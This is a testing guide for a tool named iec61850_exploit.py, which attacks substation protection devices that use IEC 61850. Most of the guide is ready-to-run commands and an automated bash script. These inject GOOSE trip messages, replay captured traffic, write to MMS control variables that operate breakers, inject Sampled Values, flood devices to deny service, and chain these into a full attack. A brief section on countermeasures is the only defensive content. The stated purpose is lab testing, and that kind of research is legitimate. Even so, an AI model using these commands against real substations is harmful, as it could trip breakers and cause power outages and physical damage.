# IEC 61850 Security Framework Testing Guide

## Test Environment Setup

### Simulated Substation Environment

**Recommended Tools**:
- **libIEC61850**: Open-source IEC 61850 implementation
- **OpenPLC**: PLC simulator with IEC 61850 support
- **IEDScout**: Free IEC 61850 client for testing
- **Virtual Network**: Isolated test network

### Hardware Requirements

**Network Interface**: Capable of promiscuous mode  
**Privileges**: Root/Administrator for raw socket access  
**Network**: Isolated from production systems

## Test Scenarios

### Test 1: Device Discovery

**Objective**: Verify IED discovery via passive sniffing

```bash
python iec61850_exploit.py -t 192.168.100.10 -m 00:11:22:33:44:55 \
    --discover --timeout 60 -i eth0 -v
```

**Expected Results**:
- GOOSE publishers detected
- MMS servers identified
- Sampled Values merging units discovered
- Device types classified

**Validation**:
```bash
# Compare with known devices
# Check MAC addresses match
# Verify protocol detection accuracy
```

### Test 2: GOOSE Trip Attack

**Objective**: Inject GOOSE trip command

**Setup**: Configure IED to listen for GOOSE messages

```bash
# Attack execution
python iec61850_exploit.py -t 192.168.100.10 -m aa:bb:cc:dd:ee:ff \
    --goose-trip \
    --gocb "RELAY01/LLN0\$GO\$gcb_trip" \
    --dataset "RELAY01/LLN0\$ds_trip" \
    --app-id 0x0001 \
    -i eth0 -v
```

**Expected Results**:
- GOOSE frames sent to multicast address
- StNum incremented properly
- Timestamp updated
- Circuit breaker responds (in simulation)

**Validation**:
```bash
# Capture traffic with Wireshark
tcpdump -i eth0 ether proto 0x88b8 -w goose_test.pcap

# Verify frame structure
# Check GOOSE PDU encoding
# Validate ASN.1 BER format
```

### Test 3: GOOSE Replay Attack

**Objective**: Replay captured GOOSE messages

**Setup**: Capture legitimate GOOSE traffic

```bash
# Capture GOOSE messages
tcpdump -i eth0 ether proto 0x88b8 -w legitimate_goose.pcap -c 100

# Execute replay
python iec61850_exploit.py -t 192.168.100.10 -m aa:bb:cc:dd:ee:ff \
    --goose-replay legitimate_goose.pcap \
    --replay-count 20 \
    -i eth0 -v
```

**Expected Results**:
- Original messages replayed exactly
- Timing preserved or accelerated
- Receiving IEDs process messages
- StNum/SqNum analysis in logs

**Validation**:
- Compare original vs replayed frames
- Check receiver state changes
- Monitor for duplicate detection

### Test 4: MMS Read Operation

**Objective**: Read variables via MMS

**Setup**: MMS server running on port 102

```bash
python iec61850_exploit.py -t 192.168.100.10 \
    --mms-read \
    --domain "CTRL" \
    --variable "CSWI1.Pos.stVal" \
    -v
```

**Expected Results**:
- TCP connection established to port 102
- MMS CONFIRMED_REQUEST sent
- CONFIRMED_RESPONSE received
- Variable value extracted

**Validation**:
```bash
# Verify MMS PDU structure
# Check TPKT/COTP headers
# Validate ASN.1 encoding
# Compare with IEDScout results
```

### Test 5: MMS Write Operation

**Objective**: Modify IED parameters

```bash
python iec61850_exploit.py -t 192.168.100.10 \
    --mms-write \
    --domain "CTRL" \
    --variable "CSWI1.Pos.ctlVal" \
    --value "true" \
    -v
```

**Expected Results**:
- Write request formatted correctly
- Server acknowledges write
- Parameter changed (verify with read)

**Validation**:
```bash
# Read value before and after
# Check write confirmation
# Verify side effects (relay operation)
```

### Test 6: MMS Domain Enumeration

**Objective**: Discover available MMS domains

```bash
python iec61850_exploit.py -t 192.168.100.10 \
    --mms-enum \
    -v
```

**Expected Results**:
- GetNameList request sent
- Domain names returned
- Logical device structure revealed

**Validation**:
- Compare with SCL file
- Check for hidden domains
- Map device structure

### Test 7: Sampled Values Injection

**Objective**: Inject malicious SV packets

```bash
python iec61850_exploit.py -t 192.168.100.10 -m aa:bb:cc:dd:ee:ff \
    --sv-inject \
    --sv-id "MU_TEST" \
    --sv-count 500 \
    -i eth0 -v
```

**Expected Results**:
- SV frames sent at 4 kHz rate
- Ethertype 0x88BA used
- Multicast destination correct
- ASDU structure valid

**Validation**:
```bash
# Capture SV traffic
tcpdump -i eth0 ether proto 0x88ba -w sv_test.pcap

# Analyze frame rate
# Check voltage/current values
# Verify sample counters
```

### Test 8: VLAN Tagged GOOSE

**Objective**: Test GOOSE with VLAN tagging

```bash
python iec61850_exploit.py -t 192.168.100.10 -m aa:bb:cc:dd:ee:ff \
    --goose-trip \
    --gocb "RELAY01/LLN0\$GO\$gcb_trip" \
    --dataset "RELAY01/LLN0\$ds_trip" \
    --vlan 5 \
    -i eth0 -v
```

**Expected Results**:
- 802.1Q VLAN tag inserted
- VLAN ID = 5
- Priority bits set appropriately
- Frames reach VLAN members only

**Validation**:
- Wireshark VLAN filter
- Check 802.1Q header
- Test VLAN isolation

### Test 9: High-Rate GOOSE Flooding

**Objective**: DoS via GOOSE message flooding

```bash
# Not implemented in base tool, manual test:
# Modify source to send 1000+ msgs/sec
# Monitor target IED CPU usage
# Check for message processing delays
```

**Expected Results**:
- Network bandwidth consumed
- IED CPU utilization increased
- Legitimate messages may be delayed
- DoS condition achieved

**Validation**:
- Monitor network utilization
- Track IED response times
- Check for dropped messages

### Test 10: Timestamp Manipulation

**Objective**: Test time-based attack vectors

```bash
# Send GOOSE with past timestamp
# Send GOOSE with future timestamp
# Rapid timestamp changes
```

**Expected Results**:
- Some IEDs accept any timestamp
- Others may reject out-of-sequence
- Time window vulnerabilities exposed

## Integration Testing

### Multi-Protocol Attack Chain

```bash
# 1. Discover network
python iec61850_exploit.py -t 192.168.100.10 -m aa:bb:cc:dd:ee:ff --discover -i eth0

# 2. Enumerate MMS
python iec61850_exploit.py -t 192.168.100.10 --mms-enum

# 3. Read current state
python iec61850_exploit.py -t 192.168.100.10 --mms-read --domain "CTRL" --variable "CSWI1.Pos.stVal"

# 4. Execute GOOSE attack
python iec61850_exploit.py -t 192.168.100.10 -m aa:bb:cc:dd:ee:ff \
    --goose-trip --gocb "RELAY01/LLN0\$GO\$gcb_trip" --dataset "RELAY01/LLN0\$ds_trip"

# 5. Generate report
python iec61850_exploit.py -t 192.168.100.10 --report attack_report.json
```

## Test Data Validation

### GOOSE Frame Structure

```
Ethernet Header:
  Destination: 01:0C:CD:01:00:00 (Multicast)
  Source: <attacker MAC>
  Type: 0x88B8 (GOOSE)

GOOSE PDU (ASN.1 BER):
  gocbRef [0x80]: VisibleString
  timeAllowedtoLive [0x81]: Integer
  datSet [0x82]: VisibleString
  goID [0x83]: VisibleString
  t [0x84]: UtcTime
  stNum [0x85]: Integer
  sqNum [0x86]: Integer
  test [0x87]: Boolean
  confRev [0x88]: Integer
  ndsCom [0x89]: Boolean
  numDatSetEntries [0x8A]: Integer
  allData [0xAB]: Sequence of Data
```

### MMS PDU Structure

```
TPKT Header:
  Version: 0x03
  Reserved: 0x00
  Length: <total length>

ISO COTP:
  Length: 0x02
  PDU Type: 0xF0 (DT Data)
  TPDU Number: 0x80

MMS PDU:
  [0xA0] CONFIRMED-RequestPDU
    invokeID: Integer
    confirmedServiceRequest: 
      [0x04] read / [0x05] write / etc.
```

## Performance Benchmarks

**GOOSE Injection Rate**: 100-1000 frames/second  
**MMS Response Time**: < 100ms typical  
**SV Injection Rate**: 4000 frames/second (50 Hz system)  
**Discovery Time**: 30-60 seconds for typical substation

## Security Validation

### Countermeasure Testing

**Test IEC 62351-6 Implementation**:
- GOOSE/SV HMAC validation
- Certificate-based authentication
- Replay protection via timestamps

**Test Network Segmentation**:
- VLAN isolation effectiveness
- Firewall rule validation
- Air-gap verification

## Automated Testing

```bash
#!/bin/bash

TARGET="192.168.100.10"
MAC="aa:bb:cc:dd:ee:ff"
IFACE="eth0"

echo "[+] Running IEC 61850 Test Suite"

echo "[*] Test 1: Discovery"
python iec61850_exploit.py -t $TARGET -m $MAC --discover -i $IFACE --timeout 30

echo "[*] Test 2: MMS Enumeration"
python iec61850_exploit.py -t $TARGET --mms-enum

echo "[*] Test 3: GOOSE Attack"
python iec61850_exploit.py -t $TARGET -m $MAC \
    --goose-trip \
    --gocb "TEST/LLN0\$GO\$gcb01" \
    --dataset "TEST/LLN0\$ds01" \
    -i $IFACE

echo "[*] Test 4: Report Generation"
python iec61850_exploit.py -t $TARGET --report test_report.json

echo "[+] Test suite complete"
```

## Common Issues

**Permission Denied**: Run with sudo/Administrator for raw sockets  
**No GOOSE Detected**: Check network interface in promiscuous mode  
**MMS Connection Refused**: Verify port 102 accessible  
**VLAN Not Working**: Check trunk configuration on switch

## References

- IEC 61850-8-1: GOOSE protocol specification
- IEC 61850-9-2: Sampled values specification
- ISO 9506: MMS specification
- IEC 62351: Security standards
